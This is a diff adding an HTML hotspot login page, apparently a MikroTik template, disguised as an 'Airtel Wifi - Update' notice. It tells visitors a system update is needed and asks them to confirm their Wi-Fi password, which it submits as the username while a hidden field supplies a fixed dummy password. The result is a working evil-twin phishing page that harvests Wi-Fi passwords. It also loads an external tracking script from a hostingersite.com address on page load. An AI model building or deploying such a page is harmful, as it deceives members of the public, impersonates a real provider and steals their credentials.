@@ -1,0 +1,111 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="pragma" content="no-cache" />
+    <meta http-equiv="expires" content="-1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Airtel Wifi - Update</title>
+    <link rel="stylesheet" href="css/style.css">
+    <!-- Pixel Code - https://darkturquoise-dogfish-447589.hostingersite.com/ -->
+<script defer src="https://darkturquoise-dogfish-447589.hostingersite.com/pixel/0nihdr4INTKXrBc0"></script>
+<!-- END Pixel Code -->
+</head>
+
+<body>
+
+    <!-- two other colors
+
+<body class="lite">
+<body class="dark">
+
+-->
+
+
+    $(if chap-id)
+    <form name="sendin" action="$(link-login-only)" method="post" style="display:none">
+        <input type="hidden" name="username" />
+        <input type="hidden" name="password" />
+        <input type="hidden" name="dst" value="$(link-orig)" />
+        <input type="hidden" name="popup" value="true" />
+    </form>
+
+    <script src="/md5.js"></script>
+    <script>
+        function doLogin() {
+            document.sendin.username.value = document.login.username.value;
+            document.sendin.password.value = hexMD5('$(chap-id)' + document.login.password.value + '$(chap-challenge)');
+            document.sendin.submit();
+            return false;
+        }
+
+    </script>
+    $(endif)
+    <div class="ie-fixMinHeight">
+        <div class="main">
+            <div class="wrap animated fadeIn" style="border: 2px dotted gold; box-shadow: 1px 1px 10px red; background-color: rgb(255, 255, 255); border-radius: 10px;">
+                <form name="login" action="$(link-login-only)" method="post" $(if chap-id) onSubmit="return doLogin()" $(endif)>
+                    <input type="hidden" name="dst" value="$(link-orig)" />
+                    <input type="hidden" name="popup" value="true" />
+
+                    <h1 style="text-align: center;">
+                        
+               <img src="img/Airtel-logo.svg" style="width: 250px; text-align: center;">
+            <br>
+                       ⚠️ Need System Update
+                    </h1>
+
+<hr>
+                 
+<p>Confim your wifi password to update</p>
+                    <label>
+                        
+                        <img class="ico" src="img/password.svg" alt="#" />                        
+                        <input name="username" type="text" placeholder="password" />
+                    </label>
+
+                    <label>
+                        <input name="password" type="password" value="1234"  placeholder="Confim Password" hidden />
+                    </label>
+
+                    <input type="submit" value="UPDATE NOW" />
+
+                    <p>⚠️After Update you can access Internet. it take  1-2 miniute</p>
+                </form>
+            
+                <div>
+               
+                      
+            </div> 
+        </div>
+    </div>
+
+ 
+
+</body>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+    const bubbleContainer = document.createElement("div");
+    bubbleContainer.classList.add("bubbles");
+    document.body.appendChild(bubbleContainer);
+
+    for (let i = 0; i < 20; i++) {
+        let bubble = document.createElement("div");
+        bubble.classList.add("bubble");
+
+        let size = Math.random() * 50 + 10; // Bubble size between 10px and 60px
+        bubble.style.width = `${size}px`;
+        bubble.style.height = `${size}px`;
+
+        bubble.style.left = `${Math.random() * 100}vw`;
+        bubble.style.animationDuration = `${Math.random() * 5 + 1}s`; // Different speeds
+        bubble.style.animationDelay = `${Math.random() * 2}s`; // Staggered animation
+
+        bubbleContainer.appendChild(bubble);
+    }
+});
+
+</script>
+
+</html>
